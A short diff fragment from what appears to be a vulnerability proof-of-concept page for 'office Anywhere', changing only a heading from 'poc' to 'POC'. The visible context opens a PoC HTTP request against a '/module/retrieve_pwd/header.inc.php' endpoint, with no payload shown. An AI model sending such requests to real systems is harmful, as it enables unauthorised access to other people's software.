@@ -7,7 +7,7 @@ title="office Anywhere"
 ```
 
 
-## poc
+## POC
 ```
 POST /module/retrieve_pwd/header.inc.php HTTP/1.1
 Host: 
